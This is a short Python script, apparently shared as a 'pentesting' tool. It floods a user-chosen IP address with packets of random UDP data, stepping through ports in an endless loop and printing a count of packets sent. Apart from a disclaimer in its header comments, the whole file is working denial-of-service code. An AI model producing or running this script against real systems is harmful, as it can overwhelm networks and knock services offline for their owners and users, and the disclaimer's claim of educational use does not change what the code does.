#  Edited to work in Python @sz
#  To be used for legitimate, authorised pentesting only.
#  DISCLAIMER: ANY MALICIOUS USE OF THE CONTENTS FROM THIS ARTICLE
#  WILL NOT HOLD THE AUTHOR & OR UPLOADER RESPONSIBLE, THE CONTENTS ARE SOLELY FOR
#  EDUCTIONAL PURPOSE & LEGITIMATE AUTHORISED PENTESTING.


import socket
import random
sent=0

from six.moves import input as raw_input


sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes=random._urandom(1024)
ip=raw_input("Target IP:")
port=int(input("port:"))

while 1:
    if port >= 65534:
        port=80
    sock.sendto(bytes,(ip,port))
    print("sent %s amount of pack to %s at port %s."%(sent,ip,port)) #you can comment this line if you don't want to display info.
    sent+=1
    port+=1
